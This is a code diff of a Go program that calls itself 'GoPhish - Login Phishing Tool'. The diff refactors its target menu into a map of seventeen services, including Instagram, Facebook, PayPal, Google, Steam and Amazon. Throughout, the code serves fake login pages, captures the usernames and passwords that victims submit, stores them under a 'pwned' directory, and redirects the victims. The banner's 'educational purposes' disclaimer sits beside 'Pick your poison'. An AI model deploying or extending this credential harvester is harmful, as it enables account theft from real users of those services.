@@ -24,78 +24,58 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"sort"
+	"strconv"
 	"strings"
 )
 
-func main() {
+/*func main() {
 	menu()
-}
+}*/
 
+var sites map[int]string
+var siteSelection int
+
+// Login stores the user's login data
 type Login struct {
 	Username string
 	Password string
 }
 
+// ChoiceHandler stores the user's choice
 type ChoiceHandler struct {
-	Choice string
+	Choice int
 	Redir  string
 }
 
+// Defaults store's the application defaults
 type Defaults struct {
 	Redirect string
 	BindIP   string
 	BindPort string
 }
 
-func menu() {
-	fmt.Println("")
-	fmt.Println("")
-	fmt.Println("Created by @DeadVCR")
-	fmt.Println("http://deadvcr.com/")
-	fmt.Println("")
-	fmt.Println("GoPhish - Login Phishing Tool")
-	fmt.Println("!!WARNING!! - Developers assume no liability and are not responsible to damage")
-	fmt.Println("caused by this program. Please use ONLY for educational purposes. Thank you!")
-	fmt.Println("--> ATTACKING TARGETS WITHOUT CONSENT IS ILLEGAL! <--")
-	fmt.Println("")
-	fmt.Println("Now... Pick your poison :)")
-	fmt.Println("")
-	fmt.Println("[01] Instagram")
-	fmt.Println("[02] Facebook")
-	fmt.Println("[03] Twitter")
-	fmt.Println("[04] Google")
-	fmt.Println("[05] PayPal")
-	fmt.Println("[06] Steam")
-	fmt.Println("[07] Linkedin")
-	fmt.Println("[08] eBay")
-	fmt.Println("[09] CryptoCurrency")
-	fmt.Println("[10] Adobe ID")
-	fmt.Println("[11] Messenger")
-	fmt.Println("[12] Twitch")
-	fmt.Println("[13] Badoo")
-	fmt.Println("[14] devianART")
-	fmt.Println("[15] Snapchat")
-	fmt.Println("[16] Netflix")
-	fmt.Println("[17] Amazon")
-	fmt.Println("")
-	fmt.Println("")
+func main() {
+	initChoices()
+	displayMenu(true, "@DeadVCR", "http://deadvcr.com/")
+
+	var defaults Defaults
 
 	loaddefaults, err := ioutil.ReadFile("defaults.json")
-	var defaults Defaults
 	if err != nil {
 		log.Fatal(err)
 	}
 	json.Unmarshal([]byte(loaddefaults), &defaults)
 
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("[*] Choose an option: ")
-	choice, _ := reader.ReadString('\n')
-	fmt.Print("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
-	redir, _ := reader.ReadString('\n')
-	fmt.Print("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
-	listenip, _ := reader.ReadString('\n')
-	fmt.Print("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")
-	listenport, _ := reader.ReadString('\n')
+	choice, _ := userPrompt("[*] Choose an option: ")
+	choiceInt, err := validateChoice(choice)
+	if err != nil {
+		crash("Your input was invalid.", 2)
+	}
+	siteSelection = choiceInt
+	redir, _ := userPrompt("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
+	listenip, _ := userPrompt("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
+	listenport, _ := userPrompt("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")
 
 	if len(listenip) <= 2 {
 		listenip = defaults.BindIP
@@ -109,57 +89,10 @@ func menu() {
 	if len(listenport) == 0 {
 		listenport = defaults.BindPort
 	}
-	bloatedChoiceHandler(choice)
-	loadTheWebMan(choice, listenip, listenport, redir)
-
+	loadTheWebMan(siteSelection, listenip, listenport, redir)
 }
 
-func bloatedChoiceHandler(choice string) string {
-	choice = strings.TrimSpace(choice)
-	returns := "default"
-	switch choice {
-	case "1":
-		returns = "instagram"
-	case "2":
-		returns = "facebook"
-	case "3":
-		returns = "twitter"
-	case "4":
-		returns = "google"
-	case "5":
-		returns = "paypal"
-	case "6":
-		returns = "steam"
-	case "7":
-		returns = "linkedin"
-	case "8":
-		returns = "ebay"
-	case "9":
-		returns = "cryptocurrency"
-	case "10":
-		returns = "adobe"
-	case "11":
-		returns = "messenger"
-	case "12":
-		returns = "twitch"
-	case "13":
-		returns = "badoo"
-	case "14":
-		returns = "devianart"
-	case "15":
-		returns = "snapchat"
-	case "16":
-		returns = "netflix"
-	case "17":
-		returns = "amazon"
-	}
-	if returns == "default" {
-		log.Fatal("Please enter a valid option. (Example: '1' for Instagram)")
-	}
-	return returns
-}
-
-func loadTheWebMan(choice, listenip, listenport, redir string) {
+func loadTheWebMan(choice int, listenip, listenport, redir string) {
 	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
 	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
 	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
@@ -168,7 +101,7 @@ func loadTheWebMan(choice, listenip, listenport, redir string) {
 	log.Fatal(http.ListenAndServe(listenip+":"+listenport, nil))
 }
 
-func (p *Login) lmaoOwnedInfo(choice string) error {
+func (p *Login) lmaoOwnedInfo(choice int) error {
 	filename := p.Username + ".json"
 	var login Login
 	json.Unmarshal([]byte(filename), &login)
@@ -178,7 +111,7 @@ func (p *Login) lmaoOwnedInfo(choice string) error {
 		log.Fatal(err)
 	}
 
-	path := "pwned/" + choice
+	path := "pwned/" + sites[choice]
 
 	if _, err := os.Stat(path); os.IsNotExist(err) {
 		os.Mkdir(path, 0755)
@@ -192,9 +125,8 @@ func (p *Login) lmaoOwnedInfo(choice string) error {
 }
 
 func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
-	theChoice := bloatedChoiceHandler(ch.Choice)
 	p := &Login{}
-	t, _ := template.ParseFiles("templates/" + theChoice + "/login.html")
+	t, _ := template.ParseFiles("templates/" + sites[siteSelection] + "/login.html")
 	t.Execute(w, p)
 }
 
@@ -207,7 +139,78 @@ func (ch *ChoiceHandler) giveMeYourInfo(w http.ResponseWriter, r *http.Request) 
 		http.Error(w, "Please enter a valid username or password!", 500)
 		return
 	}
-	theChoice := bloatedChoiceHandler(ch.Choice)
-	p.lmaoOwnedInfo(theChoice)
+	p.lmaoOwnedInfo(siteSelection)
 	http.Redirect(w, r, "//"+ch.Redir, http.StatusFound)
+}
+
+func displayMenu(warning bool, name string, website string) {
+	strings := []string{
+		"",
+		"Created by " + name,
+		website, "",
+		"GoPhish - Login Phishing Tool",
+		"!!WARNING!! - Developers assume no liability and are not responsible to damage",
+		"caused by this program. Please use ONLY for educational purposes. Thank you!",
+		"--> ATTACKING TARGETS WITHOUT CONSENT IS ILLEGAL! <--",
+		"",
+		"Now... Pick your poison :)",
+		"",
+	}
+
+	for _, v := range strings {
+		fmt.Println(v)
+	}
+
+	ints := make([]int, 0, len(sites))
+	for i := range sites {
+		ints = append(ints, i)
+	}
+	sort.Ints(ints)
+
+	for _, v := range ints {
+		fmt.Printf("[%d] %s\n", v, sites[v])
+	}
+
+}
+
+func initChoices() {
+	sites = make(map[int]string)
+	sites[1] = "Instagram"
+	sites[2] = "Facebook"
+	sites[3] = "Twitter"
+	sites[4] = "Google"
+	sites[5] = "PayPal"
+	sites[6] = "Steam"
+	sites[7] = "LinkedIn"
+	sites[8] = "eBay"
+	sites[9] = "Crypto Coin Sniper"
+	sites[10] = "Adobe ID"
+	sites[11] = "Messenger"
+	sites[12] = "Twitch"
+	sites[13] = "Badoo"
+	sites[14] = "deviantART"
+	sites[15] = "Snapchat"
+	sites[16] = "Netflix"
+	sites[17] = "Amazon"
+}
+
+func userPrompt(prompt string) (string, error) {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print(prompt)
+	response, err := reader.ReadString('\n')
+	return response, err
+}
+
+func validateChoice(choice string) (int, error) {
+	i, err := strconv.Atoi(strings.TrimSpace(choice))
+	if err != nil {
+		return 0, err
+	}
+	return i, nil
+}
+
+func crash(reason string, s int) {
+	fmt.Println(reason)
+	fmt.Printf("Exitting in %d seconds...\n", s)
+	os.Exit(1)
 }
